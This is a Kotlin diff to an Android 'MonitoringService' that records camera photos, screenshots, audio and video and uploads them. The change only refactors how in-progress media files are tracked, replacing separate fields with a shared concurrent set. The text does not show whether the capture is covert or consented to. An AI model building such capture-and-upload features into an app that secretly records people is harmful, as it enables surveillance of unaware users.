@@ -89,14 +89,9 @@ class MonitoringService : Service() {
     private val audioFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
     private val photoFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
     private val videoFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
-    @Volatile
-    private var activeAudioFile: File? = null
-    @Volatile
-    private var activePhotoFile: File? = null
-    @Volatile
-    private var activeShotFile: File? = null
-    @Volatile
-    private var activeVideoFile: File? = null
+    private val activeMediaFiles = java.util.Collections.newSetFromMap(
+        java.util.concurrent.ConcurrentHashMap<File, Boolean>()
+    )
     @Volatile
     private var ringJob: Job? = null
     @Volatile
@@ -4066,6 +4061,24 @@ class MonitoringService : Service() {
         }
     }
 
+    private fun markMediaActive(file: File?) {
+        if (file != null) activeMediaFiles.add(file)
+    }
+
+    private fun clearMediaActive(file: File?) {
+        if (file != null) activeMediaFiles.remove(file)
+    }
+
+    private fun isMediaActive(file: File?): Boolean {
+        if (file == null) return false
+        if (activeMediaFiles.contains(file)) return true
+        return try {
+            file == cameraService.currentVideoFile()
+        } catch (_: Exception) {
+            false
+        }
+    }
+
     private fun pendingMediaCount(): Int {
         return try {
             cacheDir.listFiles { file ->
@@ -4074,7 +4087,7 @@ class MonitoringService : Service() {
                         file.name.startsWith("video_") && file.name.endsWith(".mp4") ||
                         file.name.startsWith("audio_") && file.name.endsWith(".m4a")
                     )
-            }?.count { it != activePhotoFile && it != activeShotFile && it != activeVideoFile && it != activeAudioFile } ?: 0
+            }?.count { !isMediaActive(it) } ?: 0
         } catch (_: Exception) {
             0
         }
@@ -5380,7 +5393,7 @@ class MonitoringService : Service() {
                         wd.cancel()
                     } catch (_: Exception) {
                     }
-                    activePhotoFile = photoFile
+                    markMediaActive(photoFile)
                     serviceScope.launch {
                         try {
                             when (sendPhotoFile(photoFile)) {
@@ -5415,7 +5428,7 @@ class MonitoringService : Service() {
                                 }
                             }
                         } finally {
-                            activePhotoFile = null
+                            clearMediaActive(photoFile)
                         }
                     }
                 },
@@ -5537,7 +5550,7 @@ class MonitoringService : Service() {
                     }
                     return@launch
                 }
-                activeShotFile = shotFile
+                markMediaActive(shotFile)
                 try {
                     when (sendPhotoFile(shotFile)) {
                         MediaSendOutcome.SENT -> flushPendingPhotos()
@@ -5555,7 +5568,7 @@ class MonitoringService : Service() {
                         }
                     }
                 } finally {
-                    activeShotFile = null
+                    clearMediaActive(shotFile)
                 }
                 shotBusy.set(false)
             } catch (e: kotlinx.coroutines.CancellationException) {
@@ -6114,7 +6127,7 @@ class MonitoringService : Service() {
     private fun pendingVideoCount(): Int {
         return try {
             cacheDir.listFiles { file ->
-                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4") && file != activeVideoFile
+                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4") && !isMediaActive(file)
             }?.size ?: 0
         } catch (_: Exception) {
             0
@@ -6124,7 +6137,7 @@ class MonitoringService : Service() {
     private fun pendingPhotoCount(): Int {
         return try {
             cacheDir.listFiles { file ->
-                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && file != activePhotoFile && file != activeShotFile
+                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && !isMediaActive(file)
             }?.size ?: 0
         } catch (_: Exception) {
             0
@@ -6407,7 +6420,7 @@ class MonitoringService : Service() {
         var recorder: android.media.MediaRecorder? = null
         var keepForRetry = false
         var audioOutcome: MediaSendOutcome? = null
-        activeAudioFile = audioFile
+        markMediaActive(audioFile)
         try {
             recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 android.media.MediaRecorder(this)
@@ -6490,7 +6503,7 @@ class MonitoringService : Service() {
                 recorder?.release()
             } catch (_: Exception) {
             }
-            activeAudioFile = null
+            clearMediaActive(audioFile)
             if (!keepForRetry) {
                 try { if (audioFile.exists() && audioFile.length() == 0L) deleteQuietly(audioFile) } catch (_: Exception) { }
             }
@@ -6648,7 +6661,7 @@ class MonitoringService : Service() {
                     }
                     videoAttempt.incrementAndGet()
                     try { wd.cancel() } catch (_: Exception) { }
-                    activeVideoFile = videoFile
+                    markMediaActive(videoFile)
                     serviceScope.launch {
                         try {
                             if (videoFile.length() > 48L * 1024L * 1024L) {
@@ -6671,7 +6684,7 @@ class MonitoringService : Service() {
                                 }
                             }
                         } finally {
-                            activeVideoFile = null
+                            clearMediaActive(videoFile)
                             releaseOpWakeLock(videoLock)
                             recordBusy.set(false)
                         }
@@ -6805,7 +6818,7 @@ class MonitoringService : Service() {
             val now = System.currentTimeMillis()
             var batchProgress = false
             for (file in pending) {
-                if (file == activeVideoFile) continue
+                if (isMediaActive(file)) continue
                 if (now - file.lastModified() < 10_000L) continue
                 if (!file.exists() || file.length() == 0L) {
                     deleteQuietly(file)
@@ -6841,7 +6854,7 @@ class MonitoringService : Service() {
         try {
             val files = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
-            }?.sortedBy { it.lastModified() }?.filter { it != activeVideoFile } ?: return
+            }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return
             val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
@@ -6876,7 +6889,7 @@ class MonitoringService : Service() {
             val now = System.currentTimeMillis()
             var batchProgress = false
             for (file in pending) {
-                if (file == activeAudioFile) continue
+                if (isMediaActive(file)) continue
                 if (now - file.lastModified() < 10_000L) continue
                 if (!file.exists() || file.length() == 0L) {
                     deleteQuietly(file)
@@ -6912,7 +6925,7 @@ class MonitoringService : Service() {
         try {
             val files = cacheDir.listFiles { file ->
                 file.isFile && file.name.startsWith("audio_") && file.name.endsWith(".m4a")
-            }?.sortedBy { it.lastModified() }?.filter { it != activeAudioFile } ?: return
+            }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return
             val dropped = files.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
@@ -7194,7 +7207,7 @@ class MonitoringService : Service() {
             val now = System.currentTimeMillis()
             var batchProgress = false
             for (file in pending) {
-                if (file == activePhotoFile || file == activeShotFile) continue
+                if (isMediaActive(file)) continue
                 if (now - file.lastModified() < 10_000L) continue
                 if (!file.exists() || file.length() == 0L) {
                     deleteQuietly(file)
@@ -7242,7 +7255,7 @@ class MonitoringService : Service() {
             }
             val photos = cacheDir.listFiles { file ->
                 file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
-            }?.sortedBy { it.lastModified() }?.filter { it != activePhotoFile && it != activeShotFile } ?: return
+            }?.sortedBy { it.lastModified() }?.filter { !isMediaActive(it) } ?: return
             val dropped = photos.dropLast(maxKept)
             if (dropped.isEmpty()) return
             dropped.forEach { deleteQuietly(it) }
